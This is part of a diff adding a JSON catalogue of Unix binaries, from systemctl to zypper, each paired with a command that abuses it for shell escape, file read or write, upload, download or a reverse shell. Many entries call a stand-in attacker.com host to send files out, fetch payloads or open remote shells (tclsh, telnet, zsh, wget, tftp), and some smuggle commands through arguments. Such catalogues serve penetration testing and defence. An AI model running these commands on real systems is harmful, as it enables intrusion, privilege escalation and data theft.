+      "code": "echo '[Service]\nType=oneshot\nExecStart=/path/to/command\n[Install]\nWantedBy=multi-user.target' >/path/to/temp-file.service\nsystemctl link /path/to/temp-file.service\nsystemctl enable --now /path/to/temp-file.service"
+    },
+    {
+      "binary": "systemctl",
+      "category": "shell",
+      "code": "echo /bin/sh >/path/to/temp-file\nchmod +x /path/to/temp-file\nSYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target"
+    },
+    {
+      "binary": "systemd-run",
+      "category": "command",
+      "code": "systemd-run /path/to/command"
+    },
+    {
+      "binary": "systemd-run",
+      "category": "shell",
+      "code": "systemd-run -S"
+    },
+    {
+      "binary": "systemd-run",
+      "category": "shell",
+      "code": "systemd-run -t /bin/sh"
+    },
+    {
+      "binary": "tac",
+      "category": "file-read",
+      "code": "tac -s 'RANDOM' /path/to/input-file"
+    },
+    {
+      "binary": "tail",
+      "category": "file-read",
+      "code": "tail -c+0 /path/to/input-file"
+    },
+    {
+      "binary": "tailscale",
+      "category": "upload",
+      "code": "tailscale serve --http=12345 /path/to/input-file"
+    },
+    {
+      "binary": "tar",
+      "category": "download",
+      "code": "tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh"
+    },
+    {
+      "binary": "tar",
+      "category": "file-read",
+      "code": "tar cf /dev/stdout /path/to/input-file -I 'tar xO'"
+    },
+    {
+      "binary": "tar",
+      "category": "file-write",
+      "code": "echo DATA >/path/to/temp-file\ntar cf /path/to/temp-file.tar /path/to/temp-file\ntar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@"
+    },
+    {
+      "binary": "tar",
+      "category": "shell",
+      "code": "echo '/bin/sh 0<&1' >/path/to/temp-file\ntar cf /path/to/temp-file.tar /path/to/temp-file\ntar xf /path/to/temp-file.tar --to-command /bin/sh"
+    },
+    {
+      "binary": "tar",
+      "category": "shell",
+      "code": "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+    },
+    {
+      "binary": "tar",
+      "category": "shell",
+      "code": "tar xf /dev/null -I '/bin/sh -c \"/bin/sh 0<&2 1>&2\"'"
+    },
+    {
+      "binary": "tar",
+      "category": "upload",
+      "code": "tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh"
+    },
+    {
+      "binary": "task",
+      "category": "shell",
+      "code": "task execute /bin/sh"
+    },
+    {
+      "binary": "taskset",
+      "category": "shell",
+      "code": "taskset 1 /bin/sh"
+    },
+    {
+      "binary": "tasksh",
+      "category": "shell",
+      "code": "tasksh\n!/bin/sh"
+    },
+    {
+      "binary": "tbl",
+      "category": "file-read",
+      "code": "tbl /path/to/input-file"
+    },
+    {
+      "binary": "tclsh",
+      "category": "library-load",
+      "code": "tclsh\nload /path/to/lib.so x"
+    },
+    {
+      "binary": "tclsh",
+      "category": "reverse-shell",
+      "code": "tclsh\nset s [socket attacker.com 12345];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;"
+    },
+    {
+      "binary": "tclsh",
+      "category": "shell",
+      "code": "tclsh"
+    },
+    {
+      "binary": "tcpdump",
+      "category": "command",
+      "code": "echo /path/to/command >/path/to/temp-file\nchmod +x /path/to/temp-file\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file"
+    },
+    {
+      "binary": "tcpdump",
+      "category": "command",
+      "code": "tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command"
+    },
+    {
+      "binary": "tcpdump",
+      "category": "file-write",
+      "code": "tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user"
+    },
+    {
+      "binary": "tcsh",
+      "category": "file-write",
+      "code": "tcsh -c 'echo DATA >/path/to/output-file'"
+    },
+    {
+      "binary": "tcsh",
+      "category": "shell",
+      "code": "tcsh"
+    },
+    {
+      "binary": "tdbtool",
+      "category": "shell",
+      "code": "tdbtool\n! /bin/sh"
+    },
+    {
+      "binary": "tee",
+      "category": "file-write",
+      "code": "echo DATA | tee /path/to/output-file"
+    },
+    {
+      "binary": "telnet",
+      "category": "reverse-shell",
+      "code": "mkfifo /path/to/temp-socket\ntelnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket"
+    },
+    {
+      "binary": "telnet",
+      "category": "shell",
+      "code": "telnet\n!/bin/sh"
+    },
+    {
+      "binary": "terraform",
+      "category": "file-read",
+      "code": "terraform console\nfile(\"/path/to/input-file\")"
+    },
+    {
+      "binary": "tex",
+      "category": "shell",
+      "code": "tex --shell-escape '\\immediate\\write18{/bin/sh}'"
+    },
+    {
+      "binary": "tftp",
+      "category": "download",
+      "code": "tftp attacker.com\nget /path/to/input-file"
+    },
+    {
+      "binary": "tftp",
+      "category": "upload",
+      "code": "tftp attacker.com\nput /path/to/input-file"
+    },
+    {
+      "binary": "tic",
+      "category": "file-read",
+      "code": "tic -C /path/to/input-file"
+    },
+    {
+      "binary": "time",
+      "category": "shell",
+      "code": "time /bin/sh"
+    },
+    {
+      "binary": "timeout",
+      "category": "shell",
+      "code": "timeout 0 /bin/sh"
+    },
+    {
+      "binary": "tmate",
+      "category": "shell",
+      "code": "tmate -c /bin/sh"
+    },
+    {
+      "binary": "tmux",
+      "category": "file-read",
+      "code": "tmux -f /path/to/input-file"
+    },
+    {
+      "binary": "tmux",
+      "category": "shell",
+      "code": "tmux -S /path/to/socket"
+    },
+    {
+      "binary": "tmux",
+      "category": "shell",
+      "code": "tmux -c /bin/sh"
+    },
+    {
+      "binary": "top",
+      "category": "shell",
+      "code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset"
+    },
+    {
+      "binary": "torify",
+      "category": "shell",
+      "code": "torify /bin/sh"
+    },
+    {
+      "binary": "torsocks",
+      "category": "shell",
+      "code": "torsocks /bin/sh"
+    },
+    {
+      "binary": "troff",
+      "category": "file-read",
+      "code": "troff /path/to/input-file"
+    },
+    {
+      "binary": "tsc",
+      "category": "file-read",
+      "code": "tsc /path/to/input-file.ts"
+    },
+    {
+      "binary": "tsc",
+      "category": "file-write",
+      "code": "tsc /path/to/input-file.ts --outFile /path/to/output-file"
+    },
+    {
+      "binary": "ul",
+      "category": "file-read",
+      "code": "ul /path/to/input-file"
+    },
+    {
+      "binary": "unexpand",
+      "category": "file-read",
+      "code": "unexpand -t999 /path/to/input-file"
+    },
+    {
+      "binary": "uniq",
+      "category": "file-read",
+      "code": "uniq /path/to/input-file"
+    },
+    {
+      "binary": "unshare",
+      "category": "shell",
+      "code": "unshare /bin/sh"
+    },
+    {
+      "binary": "update-alternatives",
+      "category": "file-write",
+      "code": "echo DATA >/path/to/temp-file\nupdate-alternatives --force --install /path/to/output-file x /path/to/temp-file 0"
+    },
+    {
+      "binary": "urlget",
+      "category": "file-read",
+      "code": "urlget - /path/to/input-file"
+    },
+    {
+      "binary": "uuencode",
+      "category": "file-read",
+      "code": "uuencode /path/to/input-file /dev/stdout | uudecode"
+    },
+    {
+      "binary": "uv",
+      "category": "shell",
+      "code": "uv run /bin/sh"
+    },
+    {
+      "binary": "valgrind",
+      "category": "shell",
+      "code": "valgrind /bin/sh"
+    },
+    {
+      "binary": "varnishncsa",
+      "category": "file-write",
+      "code": "varnishncsa -g request -q 'ReqURL ~ \"/xxxxxxxxxx\"' -F '%{yyy}i' -w /path/to/output-file"
+    },
+    {
+      "binary": "vi",
+      "category": "file-read",
+      "code": "vi /path/to/input-file"
+    },
+    {
+      "binary": "vi",
+      "category": "file-write",
+      "code": "vi /path/to/output-file\niDATA\n^[\nw"
+    },
+    {
+      "binary": "vi",
+      "category": "shell",
+      "code": "vi -c ':!/bin/sh' /dev/null"
+    },
+    {
+      "binary": "vi",
+      "category": "shell",
+      "code": "vi -c ':set shell=/bin/sh | shell'"
+    },
+    {
+      "binary": "vi",
+      "category": "shell",
+      "code": "vi -c ':shell'"
+    },
+    {
+      "binary": "vi",
+      "category": "shell",
+      "code": "vi -c :terminal /bin/sh"
+    },
+    {
+      "binary": "vim",
+      "category": "file-read",
+      "code": "vim -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'"
+    },
+    {
+      "binary": "virsh",
+      "category": "command",
+      "code": "cat >/path/to/temp-file.xml <<EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='/path/to/command'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nvirsh -c qemu:///system create /path/to/temp-file.xml\nvirsh -c qemu:///system destroy x"
+    },
+    {
+      "binary": "virsh",
+      "category": "file-write",
+      "code": "echo DATA >/path/to/temp-file\n\ncat >/path/to/temp-file.xml <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>/path/to/output-dir/output-file</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>/path/to/output-dir/output-file</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/\nvirsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml\nvirsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file\nvirsh -c qemu:///system pool-destroy x"
+    },
+    {
+      "binary": "virsh",
+      "category": "file-write",
+      "code": "virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/\nvirsh -c qemu:///system vol-download --pool x input-file output-file\nvirsh -c qemu:///system pool-destroy x"
+    },
+    {
+      "binary": "w3m",
+      "category": "file-read",
+      "code": "w3m -dump /path/to/input-file"
+    },
+    {
+      "binary": "wall",
+      "category": "file-read",
+      "code": "wall --nobanner /path/to/input-file"
+    },
+    {
+      "binary": "watch",
+      "category": "shell",
+      "code": "watch 'reset; exec /bin/sh 1>&0 2>&0'"
+    },
+    {
+      "binary": "watch",
+      "category": "shell",
+      "code": "watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'"
+    },
+    {
+      "binary": "wc",
+      "category": "file-read",
+      "code": "wc --files0-from /path/to/input-file"
+    },
+    {
+      "binary": "wg-quick",
+      "category": "shell",
+      "code": "cat >/path/to/temp-file.conf <<EOF\n[Interface]\nPostUp = /bin/sh\nEOF\n\nwg-quick up /path/to/temp-file.conf"
+    },
+    {
+      "binary": "wget",
+      "category": "download",
+      "code": "wget http://attacker.com/path/to/input-file -O /path/to/output-file"
+    },
+    {
+      "binary": "wget",
+      "category": "file-read",
+      "code": "wget -i /path/to/input-file"
+    },
+    {
+      "binary": "wget",
+      "category": "file-write",
+      "code": "wget -i /path/to/input-file -o /path/to/output-file"
+    },
+    {
+      "binary": "wget",
+      "category": "shell",
+      "code": "echo -e '#!/bin/sh\\n/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nwget --use-askpass=/path/to/temp-file 0"
+    },
+    {
+      "binary": "wget",
+      "category": "upload",
+      "code": "wget --post-data=DATA http://attacker.com"
+    },
+    {
+      "binary": "wget",
+      "category": "upload",
+      "code": "wget --post-file=/path/to/input-file http://attacker.com"
+    },
+    {
+      "binary": "whiptail",
+      "category": "file-read",
+      "code": "whiptail --textbox --scrolltext /path/to/input-file 0 0"
+    },
+    {
+      "binary": "whois",
+      "category": "download",
+      "code": "whois -h attacker.com -p 12345 x"
+    },
+    {
+      "binary": "whois",
+      "category": "upload",
+      "code": "whois -h attacker.com -p 12345 DATA"
+    },
+    {
+      "binary": "wireshark",
+      "category": "file-write",
+      "code": "wireshark -c 1 -i lo -k -f 'udp port 12345' &\necho DATA | nc -u 127.127.127.127 12345"
+    },
+    {
+      "binary": "xargs",
+      "category": "file-read",
+      "code": "xargs -a /path/to/input-file -0"
+    },
+    {
+      "binary": "xargs",
+      "category": "shell",
+      "code": "echo x | xargs -o -a /dev/null /bin/sh"
+    },
+    {
+      "binary": "xargs",
+      "category": "shell",
+      "code": "xargs -a /dev/null /bin/sh"
+    },
+    {
+      "binary": "xargs",
+      "category": "shell",
+      "code": "xargs -a /dev/null /bin/sh"
+    },
+    {
+      "binary": "xdg-user-dir",
+      "category": "shell",
+      "code": "xdg-user-dir '}; /bin/sh #'"
+    },
+    {
+      "binary": "xdotool",
+      "category": "shell",
+      "code": "xdotool exec --sync /bin/sh"
+    },
+    {
+      "binary": "xmodmap",
+      "category": "file-read",
+      "code": "xmodmap -v /path/to/input-file"
+    },
+    {
+      "binary": "xmore",
+      "category": "file-read",
+      "code": "xmore /path/to/input-file"
+    },
+    {
+      "binary": "xpad",
+      "category": "file-read",
+      "code": "xpad -f /path/to/input-file"
+    },
+    {
+      "binary": "xxd",
+      "category": "file-read",
+      "code": "xxd /path/to/input-file | xxd -r"
+    },
+    {
+      "binary": "xxd",
+      "category": "file-write",
+      "code": "echo DATA | xxd | xxd -r - /path/to/output-file"
+    },
+    {
+      "binary": "xz",
+      "category": "file-read",
+      "code": "xz -c /path/to/input-file | xz -d"
+    },
+    {
+      "binary": "yarn",
+      "category": "shell",
+      "code": "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' >package.json\nyarn --cwd ."
+    },
+    {
+      "binary": "yarn",
+      "category": "shell",
+      "code": "echo '{\"scripts\": {\"xxx\": \"/bin/sh\"}}' >package.json\nyarn --cwd . xxx"
+    },
+    {
+      "binary": "yarn",
+      "category": "shell",
+      "code": "yarn exec /bin/sh"
+    },
+    {
+      "binary": "yash",
+      "category": "shell",
+      "code": "yash"
+    },
+    {
+      "binary": "yelp",
+      "category": "file-read",
+      "code": "yelp man:/path/to/input-file"
+    },
+    {
+      "binary": "yt-dlp",
+      "category": "shell",
+      "code": "yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'"
+    },
+    {
+      "binary": "yum",
+      "category": "command",
+      "code": "yum localinstall -y x-1.0-1.noarch.rpm"
+    },
+    {
+      "binary": "yum",
+      "category": "download",
+      "code": "yum install http://attacker.com/path/to/input-file.rpm"
+    },
+    {
+      "binary": "zathura",
+      "category": "shell",
+      "code": "zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'"
+    },
+    {
+      "binary": "zcat",
+      "category": "file-read",
+      "code": "zcat -f /path/to/input-file"
+    },
+    {
+      "binary": "zgrep",
+      "category": "file-read",
+      "code": "grep '' /path/to/input-file"
+    },
+    {
+      "binary": "zic",
+      "category": "command",
+      "code": "echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file\necho 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file\nzic -d . -y /path/to/command /path/to/temp-file"
+    },
+    {
+      "binary": "zip",
+      "category": "file-read",
+      "code": "zip /path/to/temp-file /path/to/input-file\nunzip -p /path/to/temp-file"
+    },
+    {
+      "binary": "zip",
+      "category": "shell",
+      "code": "zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'"
+    },
+    {
+      "binary": "zsh",
+      "category": "download",
+      "code": "zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n \"$(<&$REPLY)\" >/path/to/output-file'"
+    },
+    {
+      "binary": "zsh",
+      "category": "file-read",
+      "code": "zsh -c '</path/to/input-file'"
+    },
+    {
+      "binary": "zsh",
+      "category": "file-read",
+      "code": "zsh -c 'echo \"$(</path/to/input-file)\"'"
+    },
+    {
+      "binary": "zsh",
+      "category": "file-write",
+      "code": "zsh -c 'echo DATA >/path/to/output-file'"
+    },
+    {
+      "binary": "zsh",
+      "category": "reverse-shell",
+      "code": "zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+    },
+    {
+      "binary": "zsh",
+      "category": "shell",
+      "code": "zsh"
+    },
+    {
+      "binary": "zsh",
+      "category": "upload",
+      "code": "zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n \"$(</path/to/input-file)\" >&$REPLY'"
+    },
+    {
+      "binary": "zsoelim",
+      "category": "file-read",
+      "code": "zsoelim /path/to/input-file"
+    },
+    {
+      "binary": "zypper",
+      "category": "shell",
+      "code": "cp /bin/sh /path/to/temp-dir/zypper-x\nPATH=$PATH:/path/to/temp-dir/ zypper x"
+    },
+    {
+      "binary": "zypper",
+      "category": "shell",
+      "code": "cp /bin/sh /usr/lib/zypper/commands/zypper-x\nzypper x"
+    }
+  ]
+}
